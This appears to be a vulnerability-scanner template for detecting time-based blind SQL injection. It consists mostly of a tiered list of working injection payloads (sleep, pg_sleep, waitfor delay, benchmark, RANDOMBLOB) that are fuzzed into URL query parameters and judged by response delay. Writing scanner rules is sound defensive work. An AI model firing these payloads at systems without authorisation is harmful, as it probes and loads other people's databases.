id: time-based-sqli

info:
  name: Time-Based Blind SQL Injection
  author: Flawfence
  severity: critical
  description: |
    This Template detects time-based Blind SQL Injection vulnerability
  tags: time-based-sqli,sqli,dast,blind

http:
  - payloads:
      injections:
        low:
          - "sleep([SLEEPTIME])#"
          - "1 or sleep([SLEEPTIME])#"
          - "\" or sleep([SLEEPTIME])#"
          - "' or sleep([SLEEPTIME])#"
          - "\" or sleep([SLEEPTIME])=\""
          - "' or sleep([SLEEPTIME])='"
          - "1) or sleep([SLEEPTIME])#"
          - "\") or sleep([SLEEPTIME])=\""
          - "') or sleep([SLEEPTIME])='"
          - "1)) or sleep([SLEEPTIME])#"
          - "\")) or sleep([SLEEPTIME])=\""
          - "')) or sleep([SLEEPTIME])='"
          - ";waitfor delay '0:0:5'--"
          - ");waitfor delay '0:0:5'--"
          - "';waitfor delay '0:0:5'--"
          - "\";waitfor delay '0:0:5'--"
          - "');waitfor delay '0:0:5'--"
          - "\");waitfor delay '0:0:5'--"
          - "));waitfor delay '0:0:5'--"
          - "'));waitfor delay '0:0:5'--"
          - "\"));waitfor delay '0:0:5'--"
          - "benchmark(10000000,MD5(1))#"
          - "1 or benchmark(10000000,MD5(1))#"
          - "\" or benchmark(10000000,MD5(1))#"
          - "' or benchmark(10000000,MD5(1))#"
          - "1) or benchmark(10000000,MD5(1))#"
          - "\") or benchmark(10000000,MD5(1))#"
          - "') or benchmark(10000000,MD5(1))#"
          - "1)) or benchmark(10000000,MD5(1))#"
          - "\")) or benchmark(10000000,MD5(1))#"
          - "')) or benchmark(10000000,MD5(1))#"
          - "pg_sleep([SLEEPTIME])--"
          - "1 or pg_sleep([SLEEPTIME])--"
          - "\" or pg_sleep([SLEEPTIME])--"
          - "' or pg_sleep([SLEEPTIME])--"
          - "1) or pg_sleep([SLEEPTIME])--"
          - "\") or pg_sleep([SLEEPTIME])--"
          - "') or pg_sleep([SLEEPTIME])--"
          - "1)) or pg_sleep([SLEEPTIME])--"
          - "\")) or pg_sleep([SLEEPTIME])--"
          - "')) or pg_sleep([SLEEPTIME])--"
        medium:
          - "AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))bAKL) AND 'vRxe'='vRxe"
          - "AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))YjoC) AND '%'='"
          - "AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))nQIP)"
          - "AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))nQIP)--"
          - "AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))nQIP)#"
          - "SLEEP([SLEEPTIME])#"
          - "SLEEP([SLEEPTIME])--"
          - "SLEEP([SLEEPTIME])=\""
          - "SLEEP([SLEEPTIME])='"
          - "or SLEEP([SLEEPTIME])"
          - "or SLEEP([SLEEPTIME])#"
          - "or SLEEP([SLEEPTIME])--"
          - "or SLEEP([SLEEPTIME])=\""
          - "or SLEEP([SLEEPTIME])='"
          - "waitfor delay '00:00:05'"
          - "waitfor delay '00:00:05'--"
          - "waitfor delay '00:00:05'#"
          - "benchmark(50000000,MD5(1))"
          - "benchmark(50000000,MD5(1))--"
          - "benchmark(50000000,MD5(1))#"
          - "or benchmark(50000000,MD5(1))"
          - "or benchmark(50000000,MD5(1))--"
          - "or benchmark(50000000,MD5(1))#"
        high:
          - "pg_SLEEP([SLEEPTIME])"
          - "pg_SLEEP([SLEEPTIME])--"
          - "pg_SLEEP([SLEEPTIME])#"
          - "or pg_SLEEP([SLEEPTIME])"
          - "or pg_SLEEP([SLEEPTIME])--"
          - "or pg_SLEEP([SLEEPTIME])#"
          - "'\\\""
          - "AnD SLEEP([SLEEPTIME])"
          - "AnD SLEEP([SLEEPTIME])--"
          - "AnD SLEEP([SLEEPTIME])#"
          - "&&SLEEP([SLEEPTIME])"
          - "&&SLEEP([SLEEPTIME])--"
          - "&&SLEEP([SLEEPTIME])#"
          - "' AnD SLEEP([SLEEPTIME]) ANd '1"
          - "'&&SLEEP([SLEEPTIME])&&'1"
          - "ORDER BY SLEEP([SLEEPTIME])"
          - "ORDER BY SLEEP([SLEEPTIME])--"
          - "ORDER BY SLEEP([SLEEPTIME])#"
          - "(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))ecMj)"
          - "(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))ecMj)#"
          - "(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))ecMj)--"
          - "+benchmark(3200,SHA1(1))+'"
          - "+ SLEEP(10) + '"
          - "RANDOMBLOB(500000000/2)"
          - "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"
          - "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"
          - "RANDOMBLOB(1000000000/2)"
          - "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))"
          - "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))"
          - "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/"
          
    attack: pitchfork
    analyzer:
      name: time_delay
        
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{injections}}"
          
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: analyzer
        words:
          - "true"